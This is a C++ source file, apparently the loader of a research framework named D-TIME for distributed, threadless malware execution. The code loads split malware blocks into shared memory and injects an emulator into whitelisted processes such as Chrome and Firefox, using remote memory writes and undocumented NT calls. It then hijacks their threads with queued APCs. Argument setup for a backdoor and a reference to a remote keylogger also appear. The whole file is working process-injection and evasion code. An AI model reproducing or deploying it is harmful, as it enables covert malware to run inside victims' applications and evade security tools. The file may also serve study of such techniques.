/*-------------------------------------------------------------------------------------------------
 *
 *					_____             _______   _____   __  __   ______ 
 *					|  __ \           |__   __| |_   _| |  \/  | |  ____|
 *					| |  | |  ______     | |      | |   | \  / | | |__   
 *					| |  | | |______|    | |      | |   | |\/| | |  __|  
 *					| |__| |             | |     _| |_  | |  | | | |____ 
 *					|_____/              |_|    |_____| |_|  |_| |______|
 *					
 *
 * 				DISTRIBUTED THREADLESS INDEPENDENT MALWARE EXECUTION FRAMEWORK
 * 
 *-----------------------------------------------------------------------------------------------
 *
 *      Pre-requesits:
 *              1. All blocks, segments, etc... should be copied to the folder as seperate files
 *                 (plugin provides a check-box to make these files whie splitting)
 *              2. Change NBLOCKS, NSEGMS and NPROC to match the current malware split
 *              3. Best run in Visual Studio, disable all optimizations for exec.cpp
 *
 *		Best built in Visual Studio 10
 * 			Porject settings (Configuration Properties):
 *				1. C/C++ --> Advanced --> Calling convention
 *				   Set __stdcall (Gz)
 *              2. C/C++ --> Code Generation --> Buffer Security Check
 *                 Set NO
 *				3. Linker --> General --> Enable Incremental Linking
 *				   Set NO
 *				4. Linker --> System --> SubSystem
 *				   Set CONSOLE
 *
 *-----------------------------------------------------------------------------------------------*/

#include "stdafx.h"
#include "d_time.h"
 
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h> 
#include <stdio.h>
#include <stdlib.h>
#include <string.h> 
#include <windowsx.h>
#include <tlhelp32.h>
#include <process.h> 
#include <iostream>

using namespace std;

#pragma comment (lib, "Ws2_32.lib")						// Need to link with Ws2_32.lib


#define __ABORT_ON_INJECT_FAILURE__						// abort execution on failure instead of returning false
//#define __WRITE_EMULATOR_TO_FILE__					// Write the emulator code to "exec.txt" as byte string
	
#define _NBLOCKS 39                                      // number of program blocks
#define _NSEGMS  1                                      // number of program segments
#define _NPROC   2                                       // number of processes to inject D-TIME


#ifdef __NT_INJECTION__


/*  ---  List of whitelisted processes to inject to  ---
 * This enables us to restrict the malware from being injected to
 * Only the selected processes.
 */
const wchar_t* whitelist[] = {
	#ifdef __DEBUG__
		#ifdef __INJECT_CHROME__
			L"chrome.exe",
		#endif
		#ifdef __INJECT_FIREFOX__
			L"firefox.exe",
		#endif
		#ifdef __INJECT_CALC__
			L"calc1.exe",									// in Win 10, calc 32 needs to be downloaded separatly
		#endif
		#ifdef __INJECT_OPERA__
			L"opera.exe",
		#endif
		#ifdef __INJECT_VLC__
			L"vlc.exe",
		#endif
		#ifdef __INJECT_EXPLORER__
			L"explorer.exe",
		#endif
		#ifdef __INJECT_INTERNET_EXPLORER__
			L"explore.exe",
		#endif
		#ifdef __INJECT_ACR_READER__
			L"AcroRd32.exe",
		#endif
		#ifdef __INJECT_SKYPE__
			L"Skype.exe",
		#endif
			L"victim0.exe",
	#else
		L"chrome.exe",  L"_firefox.exe", L"_opera.exe",   L"_Safari.exe",
		L"_calc1.exe",
	#endif
		0
};


int whitelist_count[] = {
	#ifdef __DEBUG__
		#ifdef __INJECT_CHROME__
			1,
		#endif
		#ifdef __INJECT_FIREFOX__
			1,
		#endif
		#ifdef __INJECT_CALC__
			1,									// in Win 10, calc 32 needs to be downloaded separatly
		#endif
		#ifdef __INJECT_OPERA__
			1,
		#endif
		#ifdef __INJECT_VLC__
			1,
		#endif
		#ifdef __INJECT_EXPLORER__
			1,
		#endif
		#ifdef __INJECT_INTERNET_EXPLORER__
			1,
		#endif
		#ifdef __INJECT_ACR_READER__
			1,
		#endif
		#ifdef __INJECT_SKYPE__
			1,
		#endif
			1,
	#else
		L"chrome.exe",  L"_firefox.exe", L"_opera.exe",   L"_Safari.exe",
		L"_calc1.exe",
	#endif
		0
};

int skip_count[] = {
	#ifdef __DEBUG__
		#ifdef __INJECT_CHROME__
			0,
		#endif
		#ifdef __INJECT_FIREFOX__
			2,
		#endif
		#ifdef __INJECT_CALC__
			0,									// in Win 10, calc 32 needs to be downloaded separatly
		#endif
		#ifdef __INJECT_OPERA__
			0,
		#endif
		#ifdef __INJECT_VLC__
			0,
		#endif
		#ifdef __INJECT_EXPLORER__
			0,
		#endif
		#ifdef __INJECT_INTERNET_EXPLORER__
			0,
		#endif
		#ifdef __INJECT_ACR_READER__
			0,
		#endif
		#ifdef __INJECT_SKYPE__
			1,
		#endif
			0,
	#else
		L"chrome.exe",  L"_firefox.exe", L"_opera.exe",   L"_Safari.exe",
		L"_calc1.exe",
	#endif
		0
};


const wchar_t* blacklist[] = {                          // blacklist
	L"explorer.exe",
	0
};



typedef struct _UNICODE_STRING {
	USHORT                  Length;
	USHORT                  MaximumLength;
	PWSTR                   Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG                   Length;
	HANDLE                  RootDirectory;
	PUNICODE_STRING         ObjectName;
	ULONG                   Attributes;
	PVOID                   SecurityDescriptor;
	PVOID                   SecurityQualityOfService;
}  OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
	PVOID                   UniqueProcess;
	PVOID                   UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef NTSTATUS(__stdcall *_ZwOpenProcess)(
	PHANDLE                 ProcessHandle,
	ACCESS_MASK             DesiredAccess,
	POBJECT_ATTRIBUTES      ObjectAttributes,
	PCLIENT_ID              ClientId
	);

typedef NTSTATUS(__stdcall *_ZwAllocateVirtualMemory)(
	HANDLE                  ProcessHandle,
	PVOID                   *BaseAddress,
	ULONG_PTR               ZeroBits,
	PSIZE_T                 RegionSize,
	ULONG                   AllocationType,
	ULONG                   Protect
	);

typedef NTSTATUS(__stdcall *_ZwWriteVirtualMemory)(
	HANDLE                  ProcessHandle,
	PVOID                   BaseAddress,
	PVOID                   Buffer,
	ULONG                   NumberOfBytesToWrite,
	PULONG                  NumberOfBytesWritten OPTIONAL
	);

typedef struct _INITIAL_TEB {
	PVOID                   StackBase;
	PVOID                   StackLimit;
	PVOID                   StackCommit;
	PVOID                   StackCommitMax;
	PVOID                   StackReserved;
} INITIAL_TEB, *PINITIAL_TEB;


typedef NTSTATUS(__stdcall *_NtCreateThreadEx) (
	PHANDLE                 hThread,
	ACCESS_MASK             DesiredAccess,
	LPVOID                  ObjectAttributes,
	HANDLE                  ProcessHandle,
	LPTHREAD_START_ROUTINE  lpStartAddress,
	LPVOID                  lpParameter,
	BOOL                    CreateSuspended,
	ULONG                   StackZeroBits,
	ULONG                   SizeOfStackCommit,
	ULONG                   SizeOfStackReserve,
	LPVOID                  lpBytesBuffer
	);

typedef NTSTATUS(__stdcall *_RtlCreateUserThread)(
	HANDLE                  ProcessHandle,
	PSECURITY_DESCRIPTOR    SecurityDescriptor OPTIONAL,
	BOOLEAN                 CreateSuspended,
	ULONG                   StackZeroBits,
	OUT PULONG              StackReserved,
	OUT PULONG              StackCommit,
	PVOID                   StartAddress,
	PVOID                   StartParameter OPTIONAL,
	PHANDLE                 ThreadHandle,
	PCLIENT_ID              ClientID
	);

struct NtCreateThreadExBuffer {
	ULONG                   Size;
	ULONG                   Unknown1;
	ULONG                   Unknown2;
	PULONG                  Unknown3;
	ULONG                   Unknown4;
	ULONG                   Unknown5;
	ULONG                   Unknown6;
	PULONG                  Unknown7;
	ULONG                   Unknown8;
};

#define OBJ_CASE_INSENSITIVE   0x00000040
#define InitializeObjectAttributes( i, o, a, r, s ) { \
		(i)->Length = sizeof( OBJECT_ATTRIBUTES );    \
		(i)->RootDirectory = r;                       \
		(i)->Attributes = a;                          \
		(i)->ObjectName = o;                          \
		(i)->SecurityDescriptor = s;                  \
		(i)->SecurityQualityOfService = NULL;         \
	}

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS 0x00000000
#endif

_ZwOpenProcess              ZwOpenProcess;
_ZwAllocateVirtualMemory    ZwAllocateVirtualMemory;
_ZwWriteVirtualMemory       ZwWriteVirtualMemory;
_NtCreateThreadEx           NtCreateThreadEx;
_RtlCreateUserThread        RtlCreateUserThread;
#endif	// __NT_INJECTION__

shctrl_t    *shctrl;                                    // pointer to our shared control
LPVOID      EXECUTER;									// pointer to emulator function
ULONG       EXE_SIZE;



enum listmode {ALLOW=0, EXCLUDE};                       // type of list whitelist/blacklist


typedef NTSTATUS(__stdcall *_ZwWriteVirtualMemory)(
		HANDLE                  ProcessHandle,
		PVOID                   BaseAddress,
		PVOID                   Buffer,
		ULONG                   NumberOfBytesToWrite,
		PULONG                  NumberOfBytesWritten OPTIONAL
	);


/*
 *  fatal(): Print the error description and terminates the program.
 *
 *  Arguments: format (char*) : A format string, containing the error description
 *
 *  Return Value: None.
 */
void fatal( const char* format, ... ){
	va_list args;                                           // our arguments

	fprintf( stderr, " [ERROR]: " );                        // print error identifier

	va_start( args, format );                               // start using variable argument list
	vfprintf( stderr, format, args );                       // print error message
	va_end( args );                                         // stop using variable argument list

	fprintf( stderr, ". Quiting!\n" );                      // print trailer

	system("pause");                                        // hold on to read the message

	exit( EXIT_FAILURE );                                   // terminate with failure
}


/*
 *  setargs(): Set command line arguments.
 *		 Note that we use this as a function to make pack() function easier.
 *
 *  Arguments: s (shctrl_t*) : A pointer to shared control region
 *
 *  Return Value: None.
 */
void setargs( shctrl_t *s )
{
	// basic backdoor 3
		*(uint*)(shctrl->ctx[0].esp + 4) = 3;               // hInstance or argc
		*(uint*)(shctrl->ctx[0].esp + 8) = STACKBASEADDR    // hPrevInstance or argv
											+ 0x100;
		*(uint*)(STACKBASEADDR + 0x100) = STACKBASEADDR + 0x200;
		*(uint*)(STACKBASEADDR + 0x104) = STACKBASEADDR + 0x210;
		*(uint*)(STACKBASEADDR + 0x108) = STACKBASEADDR + 0x220;
		*(uint*)(STACKBASEADDR + 0x10c) = 0;

		strcpy( (char*)(STACKBASEADDR + 0x200), "backdoor.exe");
		strcpy( (char*)(STACKBASEADDR + 0x210), "1337");
		strcpy( (char*)(STACKBASEADDR + 0x220), "xrysa");
			
		
	// Cpp Backdoor arguments   
	/*
		*(uint*)(shctrl->ctx[0].esp + 0x4) = 0;         // hInstance or argc    
		*(uint*)(shctrl->ctx[0].esp + 0x8) = 0;         // hPrevInstance or argv
		*(uint*)(shctrl->ctx[0].esp + 0xc) = STACKBASEADDR + ARGVBASEOFF;           

		strcpy( (char*)(STACKBASEADDR + ARGVBASEOFF), "-k UserService");
	*/
}


/*
 * Fetch address and size of executer function
 * This is required to inject the function to other processes
 *		Arguments	: None
 *		Return		: None
 * Note: Values are set on Global variables EXECUTER and EXE_SIZE
 */
void get_executer_details(){
	LPBYTE  p;											// auxilary pointer
	EXECUTER =  (LPBYTE)((ULONG)executer);
	for (p = (LPBYTE)EXECUTER; strcmp((char*)p, "$end_of_D_TIME$"); p++);
	EXE_SIZE = (ULONG)p + 16 + 9 - (ULONG)EXECUTER;		// get function size
}


#ifdef __DEBUG__
DWORD __stdcall threadFn(LPVOID parameter){
	while(true){
		SleepEx(1000, TRUE);
	}
	return 0;
}
#endif

/*
 * Write emulator to shared memory so that other processes can read if needed
 */
bool write_to_shared_mem(){
	/* Write emulator to Shared memory */
	HANDLE hMapFile;
	LPBYTE shptr;
	char sharedMemName[] = {'S','Q','S','h','a','r','e','d','M','e','m','$','$','$',0};
	if((hMapFile = CreateFileMapping(
					  INVALID_HANDLE_VALUE,					// use paging file
					  NULL,									// default security
					  PAGE_READWRITE,						// read/write access
					  HIWORD(EXE_SIZE),						// maximum object size (high-order DWORD)
					  LOWORD(EXE_SIZE),						// maximum object size (low-order DWORD)
					  sharedMemName)						// name of mapping object
				 ) == NULL){
		cout<<"Failed to allocate Shared Memory"<<endl;
		return false;
	}
	if((shptr = (LPBYTE) MapViewOfFileEx(
					hMapFile,                               // handle to map object
					FILE_MAP_ALL_ACCESS,                    // read/write permission
					0,                                      // high-order 32 bits of file offset
					0,                                      // low-order 32 bits of file offset
					EXE_SIZE,                               // number of bytes to map
					NULL									// base address (NULL if we don't care)
				)) == NULL ) {                              // does an error occured ?
		CloseHandle(hMapFile);                              // close memory mapped file
															// The SharedRegion is destroyed only after
															//		UnMapViewOfFile is ALSO called, which we won't do :P
		cout<<"Can't map view of file"<<endl;
		return false;
	}
	CopyMemory((PVOID)shptr, (void*)EXECUTER, EXE_SIZE);    
	return true;
}


LPVOID writeProcMem(HANDLE hproc) {
	LPVOID rAddr;
	SIZE_T nwritten;
#ifndef __NT_INJECTION__
	if ((rAddr = VirtualAllocEx(
			hproc,												// Handle to process
			NULL,												// We don't have a prefered address
			EXE_SIZE,											// size of memory to allocate
			MEM_COMMIT,											// allocation type
			PAGE_EXECUTE_READWRITE)								// permissions
		) == NULL)
		fatal("Cannot allocate memory to remote process: %d", GetLastError());

	if (!WriteProcessMemory(
			hproc,										// Handle to process
			rAddr,										// starting addr - remote process
			EXECUTER,									// start of buffer
			EXE_SIZE,									// size of buffer
			&nwritten)									// no of bytes written
		)
		fatal("Cannot write to remote process");
#else
	HANDLE  hrthreadhdl;                                    // remote thread handle

	rAddr = NULL;                                          // clear base address
	if (ZwAllocateVirtualMemory(
			hproc,
			&rAddr,
			0,
			&EXE_SIZE,
			MEM_COMMIT,
			PAGE_EXECUTE_READWRITE)!= STATUS_SUCCESS)
		fatal("Cannot allocate memory to remote process: %d", GetLastError());

	if (ZwWriteVirtualMemory(hproc, rAddr, EXECUTER, EXE_SIZE, &nwritten) != STATUS_SUCCESS)
		fatal("Cannot write to remote process");
#endif
	return rAddr;
}


int findProc(ushort N, const wchar_t *proclist[], listmode lm, int* proc_count){
	HANDLE          snapshot, hproc;                        // snapshot and current process handles
	PROCESSENTRY32W proc32;                                 // process entry
	ushort			ninj = 0;								// number of injected processes so far
	int             skip;									// internal flag
	LPVOID			rAddr;									// address of emulator in remote proc
	uint			i;

	if ((snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
		fatal("Cannot take  a snapshot of running processes");

	proc32.dwSize = sizeof(PROCESSENTRY32W);                // set up process size
	while (Process32NextW(snapshot, &proc32) == TRUE){      // as long as there are processes in the list
		skip = !lm;
		for (i = 0; proclist[i] != NULL; i++) {				// for each process name in process list

			if (proc_count[i] <= 0) continue;
			if (!wcscmp(proc32.szExeFile, proclist[i])) {	// check if name matches
				skip = lm;                                  // =0 if ALLOW, =1 if EXCLUDE
				break;                                      // stop searching
			}
		}

		if (skip) continue;                                // is skip set? if so get next process

		if ((hproc = OpenProcess(
				PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
				FALSE,
				proc32.th32ProcessID)
			)!= NULL){
			if ((rAddr=writeProcMem(hproc))!=NULL) {
				shctrl->pidtab[ninj] = proc32.th32ProcessID;
				shctrl->emulatorAddr[ninj] = rAddr;
				proc_count[i]--;
				if (++ninj >= N)
					break;
			}
		}
	}
	return ninj;
}


int __cdecl main(int argc, char* argv[]){
	int NBLOCKS, NSEGMS, NPROC;
#ifdef __USE_CONFIG_FILE__
	char config[__MAX_CONFIG_LENGTH__] = { 0 };
	OVERLAPPED ol = { 0 };
	DWORD dwBytesRead;
	int config_vals[__NO_CONFIG_VALUES__] = { 0,0,0 };
	HANDLE configFile = CreateFileA(
		__CONFIG_FILE_NAME__,
		GENERIC_READ,				// open for writing
		FILE_SHARE_READ,			// allow multiple readers
		NULL,						// no security
		OPEN_EXISTING,				// normal file
		FILE_ATTRIBUTE_NORMAL,
		NULL);						// no attr. template
	if (configFile == NULL) {
		return 0;
	}
	if (SetFilePointer(configFile, 0, NULL, FILE_BEGIN)
		== INVALID_SET_FILE_POINTER)
		return 0;
	ReadFile(configFile, config, __MAX_CONFIG_LENGTH__-1, &dwBytesRead, &ol);
	CloseHandle(configFile);
	if (dwBytesRead == 0) return 0;
	int i=0, j=0;
	for (; i < __MAX_CONFIG_LENGTH__ && config[i] != 0 && j <__NO_CONFIG_VALUES__; ) {
		if (!(config[i] >= '0' && config[i]<= '9')) {
			++j;
			do {
				++i;
			} while (!(config[i] >= '0' && config[i] <= '9') && config[i] != 0);
		}
		else {
			config_vals[j] = config_vals[j] * 10 + config[i++] - '0';
		}
	}
	if (!(j == __NO_CONFIG_VALUES__-1 || (j==__NO_CONFIG_VALUES__ && config[i]!=0)) ) {
		return 0;
	}
	NPROC = config_vals[0]; NBLOCKS = config_vals[1]; NSEGMS = config_vals[2];
#else
	NPROC = _NPROC; NBLOCKS = _NBLOCKS; NSEGMS = _NSEGMS;
#endif

#ifdef __NT_INJECTION__

	HMODULE ntdll = GetModuleHandle("ntdll.dll");          // get ntdll.dll module

	// locate undocumented functions (with no error check)
	ZwOpenProcess = (_ZwOpenProcess)GetProcAddress(ntdll, "ZwOpenProcess");
	ZwAllocateVirtualMemory = (_ZwAllocateVirtualMemory)GetProcAddress(ntdll, "ZwAllocateVirtualMemory");
	ZwWriteVirtualMemory = (_ZwWriteVirtualMemory)GetProcAddress(ntdll, "ZwWriteVirtualMemory");
	NtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
	RtlCreateUserThread = (_RtlCreateUserThread)GetProcAddress(ntdll, "RtlCreateUserThread");

#endif
	DWORD dwBytesWritten;
	const char* LOG_ENTRY = "Start\n";
	#ifdef __LOG__
	#ifdef __VERBOSE_2__
		char __logfile[] = { 'C',':','\\','U','s','e','r','s','\\','t','e','s','t','e','r','\\',
			'A','p','p','D','a','t','a','\\','L','o','c','a','l','\\','T','e','m','p','\\',
			'A','P','C','_','F','l','a','r','e','.','t','x','t',0 
		};
		HANDLE logFile = CreateFileA(
			__logfile,
			GENERIC_WRITE,			  // open for writing
			FILE_SHARE_READ,          // allow multiple readers
			NULL,                     // no security
			TRUNCATE_EXISTING,        // open or create
			FILE_ATTRIBUTE_NORMAL,    // normal file
			NULL);                    // no attr. template
		if (logFile == INVALID_HANDLE_VALUE) {
			logFile = CreateFileA(
				__logfile,
				GENERIC_WRITE,			  // open for writing
				FILE_SHARE_READ,          // allow multiple readers
				NULL,                     // no security
				OPEN_ALWAYS,			  // open or create
				FILE_ATTRIBUTE_NORMAL,    // normal file
				NULL);                    // no attr. template
		}
		SetFilePointer(logFile, 0, NULL, FILE_BEGIN);
		WriteFile(logFile, LOG_ENTRY, lstrlenA(LOG_ENTRY), &dwBytesWritten, NULL);
		CloseHandle(logFile);
	#endif
	#ifdef __LOG_BLK_IDS__
		char __blkLogfile[] = { 'C',':','\\','U','s','e','r','s','\\','t','e','s','t','e','r','\\',
			'A','p','p','D','a','t','a','\\','L','o','c','a','l','\\','T','e','m','p','\\',
			'b','l','k','L','o','g','.','t','x','t',0 };
		HANDLE blkLogFile = CreateFileA(
			__blkLogfile,
			GENERIC_WRITE,          // open for writing
			FILE_SHARE_READ,          // allow multiple readers
			NULL,                     // no security
			TRUNCATE_EXISTING,              // open or create
			FILE_ATTRIBUTE_NORMAL,    // normal file
			NULL);                    // no attr. template
		if (blkLogFile == INVALID_HANDLE_VALUE) {
			blkLogFile = CreateFileA(
				__blkLogfile,
				GENERIC_WRITE,			  // open for writing
				FILE_SHARE_READ,          // allow multiple readers
				NULL,                     // no security
				OPEN_ALWAYS,			  // open or create
				FILE_ATTRIBUTE_NORMAL,    // normal file
				NULL);                    // no attr. template
		}
		WriteFile(blkLogFile, LOG_ENTRY, lstrlenA(LOG_ENTRY), &dwBytesWritten, NULL);
		CloseHandle(blkLogFile);
	#endif
	#endif

	#pragma region Shared_Mem_Init
	reasm();
	get_executer_details();

	/* create or attach to shared control region */
	shctrl = (shctrl_t*) crtshreg("ControlRegion", sizeof(shctrl_t), NULL );

#ifdef __PRINT_OFFSET__
	printf("nblks       : %04Xh\n", offsetof(shctrl_t, nblks));
	printf("nsegms      : %04Xh\n", offsetof(shctrl_t, nsegms));
	printf("nmods       : %04Xh\n", offsetof(shctrl_t, nmods));
	printf("funtabsz    : %04Xh\n", offsetof(shctrl_t, funtabsz));
	printf("nproc       : %04Xh\n", offsetof(shctrl_t, nproc));
	printf("nxtheapaddr : %04Xh\n", offsetof(shctrl_t, nxtheapaddr));
	printf("nxtblk      : %04Xh\n", offsetof(shctrl_t, nxtblk));
	printf("thrdst      : %04Xh\n", offsetof(shctrl_t, thrdst));
	printf("thrdrtn     : %04Xh\n", offsetof(shctrl_t, thrdrtn));
	printf("spin        : %04Xh\n", offsetof(shctrl_t, spin));
	printf("ctx         : %04Xh\n", offsetof(shctrl_t, ctx));
	printf("segm        : %04Xh\n", offsetof(shctrl_t, segm));
	printf("modl        : %04Xh\n", offsetof(shctrl_t, modl));
	printf("blk         : %04Xh\n", offsetof(shctrl_t, blk));
	printf("funtab      : %04Xh\n", offsetof(shctrl_t, funtab));
	printf("pidtab      : %04Xh\n", offsetof(shctrl_t, pidtab));
	printf("duptab      : %04Xh\n", offsetof(shctrl_t, duptab));
	printf("pLocalHeap  : %04Xh\n", offsetof(shctrl_t, pLocalHeap));
	printf("emulatorAddr: %04Xh\n", offsetof(shctrl_t, emulatorAddr));
	printf("threads	    : %04Xh\n", offsetof(shctrl_t, threads));
	printf("apc_count   : %04Xh\n", offsetof(shctrl_t, apc_count));
	printf("init_status : %04Xh\n", offsetof(shctrl_t, init_status));
	printf("mailbox     : %04Xh\n", offsetof(shctrl_t, mailbox));
	return 0;
#endif
	/* Initialise variables in shared control region */
	strcpy_s(shctrl->signature, 8, "$DTIME$");
	
	shctrl->nblks       = NBLOCKS;                      // set number of blocks
	shctrl->nsegms      = NSEGMS;                       // set number of segments
	shctrl->nproc       = NPROC;                        // set number of processses
	shctrl->nxtheapaddr = HEAPBASEADDR;                 // that's  the base address of shared heap
	shctrl->nxtblk[0] = 1;                            // always start with block 1

	/* Initialize pid and thread tables in shared control region */
	for (int i = 0; i < MAX_NO_PROC; ++i) {
		shctrl->pidtab[i] = 0;
		shctrl->init_status[i] = 0;
		for (int j = 0; j < MAX_THRDS_PER_PROC; ++j) {
			shctrl->threads[i][j] = 0;
			shctrl->apc_count[i][j] = 0;
		}
	}

	/* Initialise stack and state for each thread */
	for( int i=0; i<NMAXTHREADS; i++ ){                 // for each possible thread
		shctrl->ctx[i].esp = STACKBASEADDR
			+ (STACKSIZE + 0x20000)*i + 0x10000;		// set at the middle of current stack
		shctrl->ctx[i].ebp = shctrl->ctx[i].esp - 0x80; // OPTIONAL: just being safe by not having-
														//	the ebp at the begining
		shctrl->ctx[i].eax = 0xdeadbeef;                // that's totally useless
		shctrl->thrdst[i] = THREAD_UNUSED;              // all threads are disabled
	}

	shctrl->thrdst[0] = THREAD_RUNNING;                 // main thread is active

	/*
	 * Set up Default command line arguments:
	 *
	 *  int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd);
	 *  int main   (int argc, char *argv);
	 */

	loadsegms();                                        // load segments to shared memory
	loadmodtab();                                       // load module table to shared memory
	loadfuntab();                                       // load function table to shared memory
	loadthdtab();                                       // load thread table to shared memory
	loadinitab();                                       // load initialized pointer table to shared memory
	loadblks();                                         // load all blocks to shared memeory
		
	cout<<"[+] All blocks loaded successfully"<<endl;
	
	/* 
	 * if we want to set argc and argv main arguments (or WinMain() arguments), here's the right
	 * place to do it:
	 *  [1]. Create the shared stack
	 *  [2]. Start Placing the arguments starting from shctrl->ctx.esp + 4:
	 *  [3]. Set a possible exit point as return address
	 */
	crtshreg("SharedStack1", STACKSIZE, (void*)STACKBASEADDR );
	*(uint*)(shctrl->ctx[0].esp) = (uint)(ExitThread);  // return address to ExitThread

	// setargs( shctrl );                               // setup command line arguments

	/* 
	 * search in function table for calls to WSAStartup(). If you find it, every process must call
	 * it. It doesn't matter when you'll call this function. Instead of sending a mail to other processes
	 * at the time that the first process calls WSAStartup(), we send the mail now, to make things easier.
	 * Note that we ignore calls to WSACleanup().
	 */
	for( uint i=0; i<FUNTBLSIZE; i++ )										// scan funtab non-efficiently (it contains NULLs)
		if( !strcmp(&shctrl->funtab[i], "WSAStartup") ){					// function found?
			for( uint i=0; i<shctrl->nproc; i++ )							// for each process
				shctrl->mailbox[i][0].cmd = CMD_WSASTARTUP;					// send the proper mail to each process
		}
	

	DWORD old;
	bool res = VirtualProtect((LPVOID)((ULONG)executer), EXE_SIZE, PAGE_EXECUTE_READWRITE, &old );
	get_executer_details();
	write_to_shared_mem();

	cout << "[+] Shared Memeory Initialization - Phase 1 successful" << endl;
	#pragma endregion

#ifdef __VAR_9_TRACE_BLOCKS__							// Adding a start reference in the log file
	FILE *fp = fopen("blks.log", "a+");					//	actual log is made by emulator
	fprintf(fp, "* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *\n");
	fclose(fp);
#endif

#ifdef __SELF_INJECTION__
	shctrl->pidtab[0] = GetCurrentProcessId();
	shctrl->emulatorAddr[0] = EXECUTER;

	DWORD threadId;
	int i = 0;
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)threadFn, 0, 0, &threadId);
	cout << "[i] ThreadId: " << threadId << endl;
	shctrl->threads[0][i] = threadId;

	for (; i < MAX_THRDS_PER_PROC - 1; ++i) {
	//for (; i < 1; ++i) {
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)threadFn, 0, 0, &threadId);
		cout << "[i] ThreadId: " << threadId << endl;
		shctrl->threads[0][i] = threadId;
	}

	shctrl->threads[0][i] = GetCurrentThreadId();

	if (QueueUserAPC(
		(PAPCFUNC)shctrl->emulatorAddr[0],
		hThread,
		EXE_SIZE)) {
		cout << "[+] APC Self queueing: Successful" << endl;
		shctrl->apc_count[0][0] = 1;
	}
	else {
		fatal("[!] APC Self injection failed");
	}
	/*
	 * We will Queue APC in only onc threads. After the execution of APC in T1,
	 * T1 will queue APC in T2 and exit. At this point, there will not be any Queued APCs in T1
	 * After the execution of APC in T2, T2 will queue APC in T1, and the cycle will repeat.
	 * Note: Additionally, mutex for apc_count array takes care of synchronization TODO: Implement this
	 */

#else
	cout<<"[+] injecting to other processes"<<endl;	
	int no_inj_proc = findProc( NPROC, whitelist, ALLOW, whitelist_count);					// whitelist approach
	//findProc( NPROC, blacklist, EXCLUDE);									// blacklist approach
	
	HANDLE hThreads = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hThreads == INVALID_HANDLE_VALUE)
		fatal("[!] failed to create snapshot");
	THREADENTRY32 te;
		te.dwSize = sizeof(te);
	if (!Thread32First(hThreads, &te))
		fatal("[!] Unable to get first thread from snapshot");
	
	do {
		/* 
		 * Loop till you find owner of te in pidtab or hits the end of pidtab
		 * If first condition is met, "i" will be "pid_idx" of owner of "te".
		 */
		int i = 0;
		for (; shctrl->pidtab[i] != te.th32OwnerProcessID && i < MAX_NO_PROC; ++i) ;
		if (i == MAX_NO_PROC) continue;

		/*
		 * Find an index in the thread array to place the thread id.
		 * If the first condition is met, "j" will contain a valid index for thread
		 */
		int j = 0;
		for (; shctrl->threads[i][j] != 0 && j < MAX_THRDS_PER_PROC; ++j);
		if (j >= 
			#ifdef __LIMIT_THRD_COUNT__ 
				__LIMIT_THRD_COUNT__
			#else  
				MAX_THRDS_PER_PROC
			#endif
			) continue;
		

		//if (i > 0 && j > 15) {
		//	//int TMP = 0;
		//	//if (TMP == 0) {
		//		continue;
		//	//}
		//}



		HANDLE hThread = OpenThread(
			THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, 
			FALSE, 
			te.th32ThreadID);
		if (hThread == NULL) continue;
		if (QueueUserAPC(
			(PAPCFUNC)shctrl->emulatorAddr[i],
			hThread,
			EXE_SIZE)) {
			shctrl->threads[i][j] = te.th32ThreadID;	// update thread array
			/* We won't increament the apc_count to let multiple APCs to be queued to the thread initially
			 *			1. Queued by Loader (here)
			 *			2. Queued by init APCs
			 *				Note: init APC of every process  will queue one APC
			 */
			shctrl->apc_count[i][j] = -NPROC;				// update apc count for the thread
			cout << "[+] Injected to tid: " << te.th32ThreadID 
				 << "\tpid: "<<dec<<te.th32OwnerProcessID
				 << "\tat: 0x" << hex << shctrl->emulatorAddr[i] << endl;
			//Sleep(100);
			Sleep(1000);
		}
	} while (Thread32Next(hThreads, &te));
	
	CloseHandle(hThreads);
#endif

#ifdef __WRITE_EMULATOR_TO_FILE__
	FILE *fp = fopen("executer_raw.txt", "w");    
	LPBYTE p, funst = (LPBYTE)EXECUTER;
	for( p=(LPBYTE)funst; strcmp((char*)p, "$end_of_D_TIME$"); p++ )
		fprintf(fp, "\\x%02x", (*p) & 0xff);
	fclose( fp );
#endif

#ifndef __SELF_INJECTION__
	/*	we need to wait till one of the APC attaches the shared memory region to itself
		The shared memory will get destroyed if no live process  has it attached.
		5 seconds seems to be a long enough wait for this.
	*/
	Sleep( 5000 );
	ShowWindow(FindWindowA(NULL, "Remote Keylogger"), SW_SHOW );	// Show the window --> DEBUG purpose only
	system( "pause" );

#else
	while(true){										// infinit loop in alertible wait state to help APC consuption
		SleepEx(1000, TRUE);
	}
#endif

	return 0;
}
